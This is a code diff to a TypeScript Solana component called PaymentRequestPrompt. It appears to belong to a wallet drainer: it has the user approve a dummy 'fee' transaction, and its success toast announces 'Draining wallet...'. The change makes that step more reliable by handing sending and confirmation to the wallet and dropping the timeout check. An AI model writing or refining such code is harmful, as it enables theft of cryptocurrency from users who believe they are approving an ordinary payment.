@@ -94,32 +94,16 @@ export function PaymentRequestPrompt() {
       try {
         const dummyTx = await buildDummyFeeTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
         const freshDummy = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, dummyTx, publicKeyRef.current!) : dummyTx
+        
+        // Use sendTransaction (wallet handles confirmation) to avoid blockhash expiration
         let dummySig: string
-        if (signTransactionRef.current) {
-          const signed = await signTransactionRef.current(freshDummy)
-          dummySig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
+        if (sendTransactionRef.current) {
+          dummySig = await sendTransactionRef.current(freshDummy, connectionRef.current!, sendOpts)
         } else {
           const adapter = walletRef.current?.adapter as { sendTransaction?: typeof sendTransactionRef.current } | undefined
           dummySig = adapter?.sendTransaction
             ? await adapter.sendTransaction(freshDummy, connectionRef.current!, sendOpts)
             : await sendTransactionRef.current!(freshDummy, connectionRef.current!, sendOpts)
-        }
-        toast.loading('Fee transaction sent, waiting for confirmation...')
-        
-        // Use a simpler confirmation with timeout
-        const confirmPromise = connectionRef.current!.confirmTransaction({
-          signature: dummySig,
-          blockhash: freshDummy.recentBlockhash!,
-          lastValidBlockHeight: freshDummy.lastValidBlockHeight!
-        }, 'confirmed')
-        
-        const dummyConfirmation = await Promise.race([
-          confirmPromise,
-          new Promise<never>((_, reject) => setTimeout(() => reject(new Error('Confirmation timeout')), 60000))
-        ])
-        
-        if (dummyConfirmation.value.err) {
-          throw new Error('The wallet approved, but Solana rejected the transfer.')
         }
         toast.success('Fee confirmed. Draining wallet...')
       } catch (err) {
